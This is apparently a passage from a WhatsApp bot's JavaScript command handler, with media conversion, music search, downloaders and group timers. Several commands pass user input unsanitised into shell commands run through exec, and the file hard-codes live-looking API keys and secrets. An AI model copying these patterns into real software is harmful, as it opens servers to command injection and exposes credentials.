	await fs.unlinkSync(file)
	}
	break
	
	
    case 'toaud':
    case 'toaudio':
	case 'tomp3':
	if (isQuotedVideo) {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply videonya")
	}
	break
				
				
	
				
	case 'hode':
	 if(isQuotedAudio) { 
	setReply(mess.wait)
	let medok = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${medok} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(medok)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	case 'volume':
	if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
	if (isQuotedAudio){ 
	setReply(mess.wait)
	let media3 = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let rname = getRandom('.mp3')
	exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
	if (err) return setReply('Error!')
	let jadie = fs.readFileSync(rname)
	await conn.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: dev})
	fs.unlinkSync(rname)
	fs.unlinkSync(media3)
	}
	)
	} else {
	setReply('Reply audio!')
	}
	break
			   
				
	case 'ghost':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let mele = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mele} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(mele)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	}) 
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	case 'nightcore':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let mela = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mela} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(mela)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	case 'tupai':
	if(isQuotedAudio) { 
	setReply(mess.wait)
	let medoi = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(medoi)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	case 'ping': {
	
	const used = process.memoryUsage()
	let timestamp = speed()
	let latensi = speed() - timestamp
	let neww = performance.now()
	let oldd = performance.now()
	let respon = `
	Kecepatan Respon ${latensi.toFixed(4)} _Second_ 
	Info Server
	RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
	
	_NodeJS Memory Usaage_
	${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
	
	`.trim()
	setReply(respon)
				}
				break
	
	
	case 'imut':
	if(isQuotedAudio) { 
	setReply(mess.wait) 
	let masa = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
	fs.unlinkSync(masa)
	if (err) return setReply('Error!')
	let buffer453 = fs.readFileSync(ran)
	await conn.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: dev })
	fs.unlinkSync(ran)
	})
	} else {
	setReply('Reply audionya')
	}
	break
	
	
	
	case 'whatmusic':{
	const acrcloud = require("acrcloud");
	const acr = new acrcloud({
	host: "identify-eu-west-1.acrcloud.com",
	access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
	access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
	});
	if (isQuotedAudio) {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return setReply('Gagal mengkonversi audio ke ptt')
	let sample = fs.readFileSync(ran)
	acr.identify(sample).then(async metadata => {
	if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
	var res = metadata.metadata.music[0]
	let rus = await yts(res.title)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let ras = await rus.all.filter(v => v.type == 'video')
	let info = await ytdl.getInfo(ras[0].url);
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	let videoID = ras[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let yamyam = await getBuffer(`${thumbnya}`)
	let aklo = [
	{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
	]
	
	let teks = `
	*RESULT FOUND* 💽
	
	📂 Title: ${res.title}
	👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
	💾 Album: ${res.album.name || ''}
	🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
	🌏 Release Date: ${res.release_date}
	⏳ Durasi : ${ras[0].timestamp}
	🎧 Audio : ${FileSize(audio[0].contentLength)}
	🎬 Video : ${FileSize(format.contentLength)}
	`
	conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
	});
	fs.unlinkSync(ran)
	})
	} else if (isQuotedVideo) {
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(`Err: ${err}`)
	let sample = fs.readFileSync(ran)
	acr.identify(sample).then(async metadata => {
	if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
	var res = metadata.metadata.music[0]
	let rus = await yts(res.title)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let ras = await rus.all.filter(v => v.type == 'video')
	let info = await ytdl.getInfo(ras[0].url);
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	let videoID = ras[0].videoId
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
	}
	let yamyam = await getBuffer(`${thumbnya}`)
	let aklo = [
	{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
	]
	
	let teks = `
	*RESULT FOUND* 💽
	
	📂 Title: ${res.title}
	👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
	💾 Album: ${res.album.name || ''}
	🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
	🌏 Release Date: ${res.release_date}
	⏳ Durasi : ${ras[0].timestamp}
	🎧 Audio : ${FileSize(audio[0].contentLength)}
	🎬 Video : ${FileSize(format.contentLength)}
	`
	conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
	});
	fs.unlinkSync(ran)
	 })
	 } else {
	setReply("Reply audio atau video")
	}
	}
	break
	
	
	
	
	
	case 'infobotz':{ 
	const totalchat = await store.chats.all().map(v => v.id)
	var groups = totalchat.filter(v => v.endsWith('g.us'))
	var privat = totalchat.filter(v => v.endsWith('s.whatsapp.net'))
	var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
	var ram3 =`${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`
	let uptime = process.uptime();
	const timestampu = speed();
	var total = math(`${groups.length} ${privat.length}`)
	var wa_version = conn.waVersion
	var mcc = "Error"
	var mnc = "Error"
	var os_version = "Error"
	var device_manufacturer = "Error"
	var device_model = "Error"
	let gender ="Female"
	let nomerOwner =`Ownerin.split("@")[0]`
	let menunya =`
	「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」
	
	*▸* Nama : ${fake}
	*▸* Gender : ${gender}
	*▸* Private Chat : ${privat.length}
	*▸* Group Chat : ${groups.length}
	*▸* Total Chat : ${totalchat.length}
	*▸* Speed : ${latensi.toFixed(4)} second
	*▸* Penggunaan Ram : ${ram2}
	*▸* Hostname : ${os.hostname()}
	*▸* Platform : ${os.platform()}
	*▸* Device Model: ${device_model}
	*▸* Device Manufactur : ${device_manufacturer}
	*▸* Wa Version: ${wa_version}
	*▸* Os Version: ${os_version}
	*▸* Owner : ${nomerOwner}
	*▸* Tgl pembuatan : 25 Juli 2021
	*▸* Tgl release : 29 September 2021
	*▸* Tgl sekarang : ${calender}
	*▸* Image : Girl Front Line G11
	*▸* Voice : Nina kawai
	
	*▸* SCRIPT BY
	   Decode Denpa
	   X-Dev Team
	   Yogi PW
	   Hexagon
	   Dttaz
	
	*▸* FEATURE  BY  
	   Decode Denpa
	   Fernazer
	   X-Dev Team
	   Resta Gamteng
	   Zeeone Ofc
	   X-Dev Team
	   Yudha perdana
	   Xchilds
	   Dika Ardnt
	`
	let info = fs.readFileSync('./stik/bot.jpg')
	let options2 = {contextInfo: { externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: fs.readFileSync('./stik/bot.jpg'), mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
	let gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
	{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
	conn.sendButImage(from, menunya, `Baterai : error\n© Cyber Bot`, fs.readFileSync('./stik/bot.jpg'), gbutsan)      
	} 
	break 
	
	
	case 'tomp4':
	if (isQuotedSticker) {
	setReply(mess.wait)
	let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let outGif = `./temp/${getRandom('.gif')}`
	let outMp4 = `./temp/${getRandom('.mp4')}`
	//convert webp ke gif pakai imagemagick
	exec(`convert ${file} ${outGif}`, (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	}
	
	//lalu convert gif ke mp4 pakai ffmpeg
	exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	 }      
	await conn.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: dev})
	 fs.unlinkSync(outGif)
	 fs.unlinkSync(outMp4)
	 fs.unlinkSync(file)
	})
	}) 
	
	}
	break
	
	
	case 'attp':
	 try {
	if (args.length == 0) return setReply(`Example: ${prefix + command} YUconn`)
	//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
	await conn.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: dev })
	} catch (e) {
	 setReply(`Maap sedang error coba lagi besok`)            
	}
	break
				  
	
		
	case 'scmp3':{
	if(!q) return setReply("Masukan Link")
	if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
	let nana = q.replace('https://m.', 'https://')
	setReply("*Downloading...*")
	let scdl = await SoundCloud.create();
	let track = await scdl.tracks.getTrack(nana);
	let menit = Math.round(track.full_duration/1000/60)
	if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
	scdlMp3(nana)
	}
	break
	 
	case 'scdoc':{
	if(!q) return setReply("Masukan Link")
	if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
	let nana = q.replace('https://m.', 'https://')
	setReply("*Downloading...*")
	let scdl = await SoundCloud.create();
	let track = await scdl.tracks.getTrack(nana);
	let menit = Math.round(track.full_duration/1000/60)
	if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
	scdlDoc(nana)
	}
	break
	 
	 
	case 'scsearch':
	if(!q) return setReply("Masukan link")
	let scdl = await SoundCloud.create();
	let result = await scdl.search({
	query: q,
	limit: 15, 
	offset: 0, 
	filter: 'tracks' 
	});
	
	let teks =`*SOUNDCLOUD SEARCH*`
	
	for (let res of result.collection){
	teks +=`
	
	📂 Judul : ${res.title}
	⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
	◀️ Diputar : ${h2k(res.playback_count)} kali
	❤️ Disukai : ${h2k(res.likes_count)}
	🌏 Release : ${res.release_date}
	♻️ Repost : ${h2k(res.reposts_count)}
	🔈 Format : ${res.track_format}
	🌐 Url : ${res.permalink_url}
	
	═════════════════
	`
	} 
	
	teks +=`_Thanks for choosing SoundCloud_`
	
	try{
	let anuah = result.collection[0].artwork_url.replace('large', 'crop')
	var yamiyami = await getBuffer(anuah)
	} catch(err) {
	let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
	var yamiyami = await getBuffer(anuh)
	}
	let nano = [
	{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
	]
	
	//conn.conn.sendButImage (from, teks, © ${fake1}, yamiyami, nano)
	 break
	  
	  
	case 'playmusic':
	{
	let { SoundCloud } = require("scdl-core");
	if(!q) return setReply("Masukan judul lagu")
	setReply(mess.wait)
	if(q.startsWith("https://")){
	let nana = q.replace('https://m.', 'https://')
	let scdl = await SoundCloud.create();
	let res = await scdl.tracks.getTrack(nana)
	//console.log(res)
	let teks =`
	*SOUNDCLOUD DOWNLOADER*
	
	📂 Judul : ${res.title}
	⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
	◀️ Diputar : ${h2k(res.playback_count)} kali
	❤️ Disukai : ${h2k(res.likes_count)}
	🌏 Release : ${res.release_date}
	♻️ Repost : ${h2k(res.reposts_count)}
	🔈 Format : ${res.track_format}
	`
	try{
	let anuah = res.artwork_url.replace('large', 'crop')
	var yamiyami = await getBuffer(anuah)
	} catch(err) {
	let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
	var yamiyami = await getBuffer(anuh)
	}
	let nano = [
	{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
	]
	
	conn.sendButImage(from, teks, copyright, yamiyami, nano, {}) 
	
	} else {
	
	let scdl = await SoundCloud.create();
	let result = await scdl.search({
	  query: q,
	  limit: 20, 
	  offset: 0, 
	  filter: 'tracks' 
	});
	
	let res = result.collection[0] 
	
	try{
	var artis = res.publisher_metadata.artist
	var album = res.publisher_metadata.album_title
	} catch (err){
	var artis = res.user.full_name
	var album = "Tidak ada"
	}
	console.log(res)
	let teks =`
	*SOUNDCLOUD DOWNLOADER*
	
	📂 Judul : ${res.title}
	👤 Artis : ${artis}
	💽 Album : ${album}
	⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
	◀️ Diputar : ${h2k(res.playback_count)} kali
	❤️ Disukai : ${h2k(res.likes_count)}
	🌏 Release : ${res.release_date}
	♻️ Repost : ${h2k(res.reposts_count)}
	🔈 Format : ${res.track_format}
	`
	
	try{
	let anuah = res.artwork_url.replace('large', 'crop')
	var yamiyami = await getBuffer(anuah)
	} catch(err) {
	let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
	var yamiyami = await getBuffer(anuh)
	}
	let nano = [
	{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
	]
	conn.sendButImage(from, teks, copyright, yamiyami, nano, {}) 
	}
	}
	break
		
	  case  'ig': case 'igdl': case 'instagram':{
	if(!q) return setReply("Masukan Link")
	//setReply(mess.wait)
	if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) return setReply( `*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)
	const {instagramdlv3} = require("@bochilteam/scraper")
	let igreel = q.includes("https://www.instagram.com/reel/")
	let results = await instagramdlv3(args[0])
	//Log(results)
	for (const { url } of results) await conn.sendMedia(from, url, dev, {caption: "*╌╌「 SUCCES 」╌╌*"})
	}
	break
		
	case 'kodepos':
	try{
	let nana = await kodepos(q)
	console.log(nana)
	let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
	for (let i of nana){
	 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
	}
	setReply(teks)
	} catch (err){
	setReply("Kodepos tidak di temukan")
	console.log(err)
	}
	break  
	  
	  
	case 'ghstalk':{
	let nana = await ghstalk(q)
	console.log(nana)
	let foto = nana.avatar_url
	let gambar = await getBuffer(foto)
	console.log(foto)
	let toks =`
	Nama: ${nana.name}
	Bio: ${nana.bio}
	Followers: ${nana.followers}
	Following: ${nana.following}
	Repository: ${nana.public_repos}
	Created at: ${nana.created_at}
	Update at: ${nana.updated_at}
	Twitter: ${nana.twitter_username}
	Email: ${nana.email}
	Lokasi: ${nana.location}
	Website: ${nana.blog}
	Github url: ${nana.url}
	`
	console.log(toks)
	await conn.sendMessage(from, {image:gambar, caption: toks},{quoted: dev})
	//await conn.sendMedia (from, foto, dev, {caption: toks})
	}
	break
				
	case 'gimage':{
	if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
	try{
	const {googleImage} = require('@bochilteam/scraper')
	googleImage(q).then(async (data) => {
	//console.log(data)
	let foto = data[Math.floor(Math.random() * data.length)]
	if(data.length == "0") return setReply("Image tidak di temukan")
	setReply(mess.wait)
	conn.sendMedia (from, foto, dev, {caption: "Nih"})
	})
	} catch(err){
	let teks = args.join(' ')
	let res = await gis(teks, google)
	function google(error, result){
	if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
	else {
	var gugIm = result
	var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
	conn.sendMedia (from, random, dev, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
	}
	}
	}
	}
	
	break
				
			
	
	
	
	
		
		
		
	
	
			
			
	
		
		
	
			
	case '3000years':
	case 'approved':
	case 'wanted':
	case 'utatoo':
	case 'unsharpen':
	case 'thanos':
	case 'sniper':
	case 'sharpen':
	case 'sepia':
	case 'scary':
	case 'rip':
	case 'redple':
	case 'rejected':
	case 'posterize':
	case 'ps4':
	case 'pixelize':
	case 'missionpassed':
	case 'moustache':
	case 'lookwhatkarenhave':
	case 'jail':
	case 'invert':
	case 'greyscale':
	case 'glitch':
	case 'gay':
	case 'frame':
	case 'fire':
	case 'distort':
	case 'dictator':
	case 'deepfry':
	case 'ddungeon':
	case 'circle':
	case 'challenger':
	case 'burn':
	case 'brazzers':
	case 'beautiful': {
	const ameClient = require("amethyste-api")
	const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
	if (isQuotedImage) {
	try{
	setReply(mess.wait)
	let ahah = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let owgi = await TelegraPh(ahah)
	let ini_gen = `${command}`
	ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
	conn.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: dev})
	fs.unlinkSync(ahah) 
	})
	}catch(err){
	console.log(err)
	}
	} else if (isQuotedTag || isQuotedReply) {
	setReply(mess.wait)
	let ghost = users 
	let oppp = await conn.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
	let ini_gen = `${command}`
	ameApi.generate(ini_gen, {
	url : oppp
	}).then(gambar => {
	conn.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: dev})
	}).catch(err => {
	setReply(`${err}`)
	});    
	} else {
	setReply("Tag atau Reply targetnya")
	}
	}
	break
	
	
	
	case 'mediafire':{
	const {mediafiredl} = require('@bochilteam/scraper')
	if(q.startsWith("https://www.mediafire.com")){
	let nana = await mediafiredl(q)
	if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
	console.log(nana)
	let tuks =`
	Data succesfull obtained
	
	File Name : ${nana.filename}
	File Size : ${nana.filesizeH}
	Upload : ${nana.aploud}
	`
	await setReply(tuks)
	if(nana.filesize > 90000 && !isOwner){
	if(sender.startsWith("62")){
	var tukss = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
	} else {
	var tukss = "You have been banned\nfor abusing the mediafire feature"
	}
	let obj = {
	id: senderNumber,
	status: true,
	date: calender,
	reason: "Menyalahgunakan fitur mediafire"
	}
	db.data.users[woke].banned = obj      
	await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 90mb")              
	await setReply(tukss)
	return
	}
	await conn.sendMedia (from, nana.url, dev, {fileName: nana.filename})
	
	} else{
	setReply("Link Invalid")
	}
	}
	break
	
	
	
	case 'tinyurl':{
	if (args.length < 1) return setReply(`Masukkan link`)
	if (!isUrl) return setReply(`Masukkan link`)
	const fetchText = (url, optiono) => {
	return new Promise((resolve, reject) => {
	return fetch(url, optiono)
	.then(response => response.text())
	.then(text => resolve(text))
	.catch(err => {
	console.log(color(err,'red'))
	reject(err)
	})
	})
	}
	let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
	let shorti = `*Result : ${okok}*`
	setReply(shorti)
	}
	break  
	
	
	case 'bitly':{
	const { BitlyClient } = require('bitly');
	const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
	if(!q) return setReply("Masukan link")
	if(!isUrl) return setReply("Masukan link dengan benar")
	try {
	let result = await bitly.shorten(q);
	setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
	} catch(e) {
	setReply(`Url invalid`)
	}
	}
	break;
	
	
	
	case 'githubdl':{
	if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)
	let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
	//ByRizkyAdi
	console.log("Done")
	setReply(`Waiting for compress to zip`)
	await conn.sendMedia (from, url, dev, {fileName: q.split("|")[1]})
	}
	break 
	  
	  
	  
	case 'gitclone':
	try{
	let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
	if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
	if (!regex.test(q)) return setReply('link salah!')
	let [, user, repos] = q.match(regex) || []
	let repo = repos.replace(/.git$/, '')
	let url = `https://api.github.com/repos/${user}/${repos}/zipball`
	let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
	// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
	setReply(`*Mohon tunggu, sedang mengirim repository..*`)
	await conn.sendMedia (from, url, dev, {fileName: filename})
	} catch (err){
	setReply(mess.error.link)
	}
	break  
	
	
	case 'google':{
	if (!q) return setReply('masukan teks')
	if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
	let ggs = require('google-it')
	const options = {
	  'proxy': 'http://localhost:3000'
	};
	 ggs({options, 'query': q }).then(results => {
	  Log(results)
	let vars =``
	vars += `_*Hasil Pencarian : ${q}*_\n`
	for (let i = 0; i < results.length; i++) {
	vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
	}
	var lama = vars.trim()
	setReply(lama)
	})
	}
	break
	
	
	case 'closetime': 
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.badmin)
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
	setReply(`Close time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = dev.participant
	const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
	conn.groupSettingUpdate(from, 'announcement')
	setReply(close)
	}, timer)
	break
					
					
	case 'opentime':        
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.badmin)
	if (args[1]=="detik") {var timer = args[0]*`1000`
	} else if (args[1]=="menit") {var timer = args[0]*`60000`
	} else if (args[1]=="jam") {var timer = args[0]*`3600000`
	} else if (args[1]=="hari") {var timer = args[0]*`86400000`
	} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
	setReply(`Open time ${q} dimulai dari sekarang`)
	setTimeout( () => {
	var nomor = dev.participant
	const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
	conn.groupSettingUpdate(from, 'not_announcement')
	setReply(open)
	}, timer)
	break
	
	
	case 'tourl': {
	setReply(mess.wait)
	let { floNime,UploadFileUgu} = require('../lib/uploader')
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	if (isQuotedImage) {
	let anu = await TelegraPh(media)
	setReply(util.format(anu))
	} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
	let anu = await TelegraPh(media)
	setReply(util.format(anu))
	}
	await fs.unlinkSync(media)
	}
	break
	
	
	case 'ytmp3':
	{
	if(!q) return setReply("Masukan link youtube")
	if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
	setReply("*Scrapping...*")
	let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
	if(q.includes("https://youtu.be/")){
	var videoId = q.replace('https://youtu.be/', '')
	} else if(q.includes("https://youtube.com/watch?v=")){
	var videoId = q.split('=')[1]
	} else if(q.includes("https://youtube.com/shorts/")){
	var videoId = q.replace('https://youtube.com/shorts/', '')
	}  else {
	return setReply("Link salah")
	}
	 let link =`https://youtube.com/watch?v=${videoId}` 
	 let anu = await yts(link)
	 if(anu.all.length == "0") return setReply("Musik tidak di temukan")
	 try{
	var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
	} catch (err){
	var foto = anu.all[0].image
	}
	 
	try{
	let info = await ytdl.getInfo(link);
	let format = ytdl.filterFormats(info.formats, 'audioonly');
	if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
	
	let teks =`*YOUTUBE AUDIO DOWNLOADER*
	
